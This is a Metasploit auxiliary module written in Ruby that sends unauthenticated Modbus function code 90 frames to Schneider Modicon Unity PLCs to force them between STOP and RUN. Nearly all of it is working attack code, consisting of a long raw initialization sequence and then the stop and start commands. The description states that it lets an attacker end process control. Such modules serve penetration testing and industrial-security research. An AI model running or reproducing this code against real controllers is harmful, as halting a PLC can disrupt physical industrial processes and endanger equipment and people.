##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Rex::Socket::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Schneider Modicon Remote START/STOP Command',
      'Description'   => %q{
        The Schneider Modicon with Unity series of PLCs use Modbus function
        code 90 (0x5a) to perform administrative commands without authentication.
        This module allows a remote user to change the state of the PLC between
        STOP and RUN, allowing an attacker to end process control by the PLC.

        This module is based on the original 'modiconstop.rb' Basecamp module from
        DigitalBond.
      },
      'Author'         =>
        [
          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module
          'todb' # Metasploit fixups
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]
        ],
      'DisclosureDate' => 'Apr 5 2012'
      ))
    register_options(
      [
        OptEnum.new("MODE", [true, 'PLC command', "STOP",
          [
            "STOP",
            "RUN"
          ]
        ]),
        Opt::RPORT(502)
      ], self.class)

  end

  # this is used for building a Modbus frame
  # just prepends the payload with a modbus header
  def makeframe(packetdata)
    if packetdata.size > 255
      print_error("packet too large, sorry")
      print_error("Offending packet: " + packetdata)
      return
    end
    payload = ""
    payload += [@modbuscounter].pack("n")
    payload += "\x00\x00\x00" #dunno what these are
    payload += [packetdata.size].pack("c") # size byte
    payload += packetdata
  end

  # a wrapper just to be sure we increment the counter
  def sendframe(payload)
    sock.put(payload)
    @modbuscounter += 1
    r = sock.recv(65535, 0.1) # XXX: All I care is that we wait for a packet to come in, but I'd like to minimize the wait time and also minimize OS buffer use.  What to do?
    return r
  end

  # This function sends some initialization requests
  # I have no idea what these do, but they seem to be
  # needed to get the Modicon chatty with us.
  # I would make some analogy to 'gaming' in the
  # bar-dating scene, but I'll refrain.
  def init
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x01\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x0a\x00" + 'T' * 0xf9
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x03\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x03\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x01\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x0a\x00"
    (0..0xf9).each { |x| payload += [x].pack("c") }
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x64\x00\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x01\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x5a\x02\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x46\x03\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x3c\x04\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x32\x05\x00\x00\xf6\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x14\x00\x28\x06\x00\x00\x0c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x00\x00\x00\x00\x64\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x20\x00\x13\x00\x64\x00\x00\x00\x9c\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x10\x43\x4c\x00\x00\x0f"
    payload += "USER-714E74F21B" # Yep, really
    #payload += "META-SPLOITMETA"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x50\x15\x00\x01\x0b"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x50\x15\x00\x01\x07"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x12"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x12"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x02"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x01\x00\x00\x00\x00\xff\xff\x00\x70"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x00\x58\x07\x01\x80\x00\x00\x00\x00\xfb\x00"
    sendframe(makeframe(payload))
  end

  def stop
    payload = "\x00\x5a\x01\x41\xff\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
  end

  def start
    payload = "\x00\x5a\x01\x40\xff\x00"
    sendframe(makeframe(payload))
    payload = "\x00\x5a\x01\x04"
    sendframe(makeframe(payload))
  end

  def run
    @modbuscounter = 0x0000 # used for modbus frames
    connect
    init
    case datastore['MODE']
    when "STOP"
      stop
    when "RUN"
      start
    else
      print_error("Invalid MODE")
      return
    end
  end
end
